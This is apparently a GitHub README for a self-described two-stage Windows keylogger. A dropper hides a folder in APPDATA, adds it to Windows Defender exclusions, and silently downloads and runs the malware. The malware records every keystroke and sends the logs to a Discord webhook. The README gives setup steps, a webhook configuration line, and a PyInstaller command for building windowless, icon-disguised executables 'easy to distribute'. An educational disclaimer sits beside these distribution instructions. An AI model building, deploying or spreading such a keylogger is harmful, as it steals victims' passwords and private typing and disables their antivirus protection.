# Keylogger Malware - Offensive Security Project


This is a **keylogger malware** I built as part of my **offensive security journey**. It captures every key pressed on a Windows system and sends the logs to a **Discord webhook** every **10 seconds of inactivity**.


## 🔒 Disclaimer
Disclaimer: This project is for educational purposes only. I am not responsible for any misuse or unauthorized activity that may occur using this malware. Always use it with explicit permission and in a controlled environment.

## 🚀 Features

- **Stealthy keylogging** using a **hidden folder** in `APPDATA`.
- **Automatically added to Windows Defender exclusions** to avoid detection.
- **Silent execution** with no visible window.
- **Logs sent to Discord** in real-time via a webhook.
- **Easy to use with a dropper script** that sets up the environment and runs the malware.

## 📌 How It Works

### 🔧 Dropper Script
The dropper script creates a **hidden folder** and **adds it to Windows Defender exclusions**, then downloads and runs the **malware** in the background.

### 🕵️‍♂️ Malware Script
The malware listens for keyboard input, records the keys, and sends them to your Discord server when the user is **inactive for 10 seconds**.

## 📁 File Structure
Keylogger-Malware-Project/ │ ├── dropper.py ├── malware.py ├── output/ │ ├── log.txt │ └── master_log.txt | └── README.md


## 🧾 Requirements

- Python 3.7+
- `pynput` for keyboard input
- `requests` for sending logs to Discord
- A **Discord webhook URL** 

## 📦 Installation

1. **Clone the repository**:
   ```bash
   https://github.com/wmdgimhana/Two-stage-keylogger-for-windows.git
Add your Discord Webhook URL: 
DISCORD_WEBHOOK=https://discord.com/api/webhooks/your-webhook-url
Run the dropper:

python dropper.py


## 📚 Windows EXE

**Create Windows .exe Files
To make the dropper and malware more portable and easy to distribute, you can use PyInstaller to convert them into Windows executable files.**

🧰 PyInstaller Command
To create .exe files for both the dropper and the malware, use the following command in your terminal or command prompt:
```bash
.\venv\Scripts\python.exe -m PyInstaller --onefile --noconsole --icon=logo.ico dropper.py
```
This will generate a single-file executable with a custom icon and no console window.

✅ Note: You need to have PyInstaller installed and a virtual environment set up.



📽️ Usage
This tool is intended for educational purposes only.
It captures keystrokes and sends them to your Discord server every 10 seconds of inactivity.
Use it for penetration testing, security research, or learning how malware operates.



